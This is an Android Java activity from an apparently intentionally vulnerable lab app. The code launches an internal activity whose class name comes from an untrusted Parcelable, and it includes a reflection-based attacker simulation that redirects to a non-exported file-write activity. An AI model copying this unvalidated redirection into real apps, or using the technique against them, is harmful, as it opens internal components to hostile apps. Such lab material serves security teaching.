package com.vulnlab.app.activities;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

import com.vulnlab.app.R;
import com.vulnlab.app.models.UserAction;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

public class CrossAppClassLoaderActivity extends AppCompatActivity {

    private static final String TAG = "VulnCrossClassLoader";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_cross_classloader);

        TextView tvOutput = findViewById(R.id.tv_output);
        Intent intent = getIntent();

        // ── Victim side: receive and trust the attacker-crafted Parcelable ──
        if (intent.hasExtra("action")) {
            UserAction action = intent.getParcelableExtra("action");
            if (action != null) {
                Log.d(TAG, "[cross-classloader] received action: "
                    + "target=" + action.targetActivity
                    + " data=" + action.payloadData);
                // VULN: target class name from Parcelable — not validated
                try {
                    Intent next = new Intent();
                    next.setClassName(getPackageName(), action.targetActivity);
                    next.putExtra("data", action.payloadData);
                    startActivity(next);
                    tvOutput.setText("Fired internal activity: " + action.targetActivity);
                } catch (Exception e) {
                    tvOutput.setText("Error: " + e.getMessage());
                }
                return;
            }
        }

        // ── Demo: simulate how an attacker would use createPackageContext ──
        // This button shows the attack vector (runs as the victim app itself here)
        Button btnSimulate = findViewById(R.id.btn_simulate);
        btnSimulate.setOnClickListener(v -> {
            tvOutput.setText(simulateAttackerFlow());
        });
    }

    /**
     * Simulates the attacker calling createPackageContext on the victim.
     * In reality this code runs in a separate malicious app.
     */
    private String simulateAttackerFlow() {
        try {
            // Step 1: get victim's ClassLoader
            Context victimCtx = createPackageContext(
                getPackageName(),
                Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
            ClassLoader victimCl = victimCtx.getClassLoader();
            Log.d(TAG, "[cross-classloader] got victim ClassLoader: " + victimCl);

            // Step 2: load victim's UserAction class
            Class<?> userActionClass = victimCl.loadClass(
                "com.vulnlab.app.models.UserAction");
            Log.d(TAG, "[cross-classloader] loaded class: " + userActionClass);

            // Step 3: construct a malicious UserAction instance via reflection
            Constructor<?> ctor = userActionClass.getDeclaredConstructor();
            ctor.setAccessible(true);
            Object maliciousAction = ctor.newInstance();

            Field targetField = userActionClass.getDeclaredField("targetActivity");
            targetField.setAccessible(true);
            // VULN: target points to an internal, non-exported activity
            targetField.set(maliciousAction, "com.vulnlab.app.activities.FileWriteActivity");

            Field dataField = userActionClass.getDeclaredField("payloadData");
            dataField.setAccessible(true);
            dataField.set(maliciousAction, "attacker-controlled-payload");

            // Step 4: pack into Intent and fire (normally to the exported activity)
            Intent attackIntent = new Intent(this, CrossAppClassLoaderActivity.class);
            attackIntent.putExtra("action", (android.os.Parcelable) maliciousAction);
            startActivity(attackIntent);

            return "Attacker flow simulated.\n"
                + "Constructed UserAction:\n"
                + "  targetActivity = com.vulnlab.app.activities.FileWriteActivity\n"
                + "  payloadData = attacker-controlled-payload\n\n"
                + "Fired intent to CrossAppClassLoaderActivity.";
        } catch (Exception e) {
            Log.e(TAG, "Simulation error", e);
            return "Simulation error: " + e.getMessage();
        }
    }
}
